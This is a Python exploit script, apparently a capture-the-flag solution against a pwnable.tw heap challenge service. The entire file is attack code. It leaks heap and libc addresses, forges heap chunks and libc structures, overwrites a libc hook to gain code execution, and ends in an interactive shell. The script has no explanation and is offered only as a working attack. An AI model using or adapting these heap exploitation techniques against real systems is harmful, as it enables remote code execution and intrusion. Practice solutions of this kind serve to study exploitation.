from PwnIOI import *
import time,os
t = int(time.time())
#s = IOI(['192.168.0.85',1234])
s = IOI(['chall.pwnable.tw',10302])
mmap = "0x"+os.popen("./mmap "+str(t)).read()[:-1]
mmap = int(mmap,16)
log(" mmap : 0x%x"%mmap)
raw_input()
def add(size,name,dat):
  s.read_until('choice :')
  s.write('1\n')
  s.read_until('heart :')
  s.write(str(size)+'\n')
  s.read_until('heart :')
  s.write(name)
  s.read_until('heart :')
  s.write(dat)
def delete(index):
  s.read_until('choice :')
  s.write('3\n')
  s.read_until('Index :')
  s.write(str(index)+'\n')
add(0x100,p64(0x41414141)+p64(0x100)+p64(mmap+0x8)*2,'B')
add(0x100,p64(0x41414141)+p64(0x100)+p64(mmap+0x8)*2,'B')
delete(0)
add(0x100,p64(0x41414141)+p64(0x100)+p64(mmap+0x8)*2,'B')
add(0x38,'A'*0x20,'A'*0x30)
# leak
s.read_until('choice')
s.write('2\n')
s.read_until('Index :')
s.write('2\n')
heap_base = u64(s.read_until('Secret')[0x41-6:0x41]+'\x00\x00') - 0x230
log(" heap_base : 0x%x"%heap_base)
# manipulate heap
add(0xf8,p64(0x41414141)+p64(0x100)+p64(mmap+0x68)*2,'B')
delete(2)
fake_size = ((heap_base+0x260)-(mmap+0x68))&0xffffffffffffffff
log(" fake_size : 0x%x"%fake_size)
dat = "A"*0x30
dat += p64(fake_size)
add(0x38,p64(0x41414141)+p64(0x100)+p64(mmap+0x68)*2,dat)
delete(3)
delete(2)
# libc leak
dat = p64(0)*2+p64(heap_base+0x18)
dat += p64(0)*8
dat += p64(0)+p64(0x81)
dat += p64(0)+p64(0x71)
dat += p64(0)*5
dat += p64(mmap+0xc0+0x30)
dat += p64(0)*2
dat += p64(0) + p64(0x0000000000002240)
dat += p64(0)+p64(mmap+0xb0+0x30)
dat += p64(0)+p64(0x2240)+p64(0)+p64(0x2240)
add(0x100,p64(0x41414141)+p64(0xf00000)+p64(mmap+0x68)*2,dat)
s.read_until('choice')
s.write('2\n')
s.read_until('Index :')
s.write('2\n')
libc_base = u64(s.read_until('=')[-2-6:-2]+'\x00\x00') - 0x3c3b78
log(" libc : 0x%x"%libc_base)
delete(5)
delete(6)
add(0x78,p64(libc_base+0x045390),p64(0)+p64(0x71)+p64(libc_base+0x3c46b5+8)+'A'*40)
add(0x68,'1234','1234')
dat = p64(0x6873)
dat += p64(0)
dat += p64(libc_base+0x3c46a3)*7
dat += p64(0)*4
dat += p64(libc_base+0x3c38e0)
dat += p64(1)
dat += p64(0xffffffffffffffff)
dat += p64(0x000000000a000000)
dat += p64(libc_base+0x3c5780)
dat += p64(0xffffffffffffffff)
dat += p64(0)
dat += p64(libc_base+0x3c37a0)
dat += p64(0)*3
dat += p64(0x00000000ffffffff)
dat += p64(0)*2
dat += p64(mmap+0x98-0x38)
dat += p64(libc_base+0x3c4540)
add(0x100,'1234',dat)
add(0x68,'1234','A'*0x3b+p64(mmap+0x188))
s.interact()
